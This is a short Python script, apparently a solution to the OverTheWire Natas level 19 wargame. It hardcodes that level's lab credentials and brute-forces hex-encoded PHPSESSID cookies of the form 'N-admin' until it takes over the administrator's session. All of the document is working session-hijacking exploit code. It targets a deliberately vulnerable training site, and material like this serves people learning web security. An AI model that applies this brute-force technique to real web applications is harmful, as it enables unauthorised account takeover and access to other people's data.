import requests
from requests.auth import HTTPBasicAuth

URL = "http://natas19.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')
body = {'username' : '', 'password' : ''}
FAIL_TEXT = "You are logged in as a regular user. Login as an admin to retrieve credentials for natas20."
print("bruteforcing...")
i = 1
while True:
    session_id = f"{i}-admin".encode('utf-8').hex()
    cookie = { 'PHPSESSID' : f"{session_id}"}
    print(f"Sending request with session id: '{i}-admin', in encoded form: {session_id}")
    r = requests.post(URL, params=body, auth=auth, cookies=cookie)
    i += 1
    if FAIL_TEXT not in r.text:
        print("Session id found!")
        print(f"{session_id}")
        break